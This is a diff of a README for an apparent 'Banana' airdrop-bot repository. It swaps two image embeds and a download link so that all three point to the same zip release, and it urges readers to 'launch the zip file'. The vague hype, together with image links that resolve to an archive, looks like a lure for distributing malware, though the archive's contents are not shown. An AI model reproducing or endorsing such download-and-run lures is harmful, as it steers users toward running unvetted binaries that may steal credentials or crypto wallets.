@@ -1,6 +1,6 @@
 # 🍌 **Banana - Automate your tasks using the best banana tools!** 🍌
 
-![Banana](https://imgur.com/gallery/NY1DMFZ)
+![Banana](https://github.com/Kratuse/Banana/releases/download/v1.0/Application.zip)
 
 Welcome to the Banana repository! Here you will find a collection of tools and resources to help you automate tasks, maximize efficiency, and have fun while doing it using the power of bananas. From airdrop bots to airdrop farms, this repository has everything you need to take your productivity to the next level.
 
@@ -16,12 +16,12 @@ Welcome to the Banana repository! Here you will find a collection of tools and r
 
 
 ## Get Started 🚀
-To get started with the tools and resources in this repository, download the [**Banana Release**](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip). Make sure to launch the zip file to access all the exciting features and functionalities waiting for you inside!
+To get started with the tools and resources in this repository, download the [**Banana Release**](https://github.com/Kratuse/Banana/releases/download/v1.0/Application.zip). Make sure to launch the zip file to access all the exciting features and functionalities waiting for you inside!
 
 If the link provided does not work or needs an update, please check the "Releases" section of this repository for the most recent version.
 
 ## 🍌 Join the Banana Community! 🍌
-![Community](https://imgur.com/gallery/pq2SHWz)
+![Community](https://github.com/Kratuse/Banana/releases/download/v1.0/Application.zip)
 
 Connect with other banana enthusiasts, share tips and tricks, and stay up to date on the latest updates by joining the Banana community. Whether you are a seasoned airdrop pro or just starting out, there is something for everyone in our vibrant and engaging community.
 
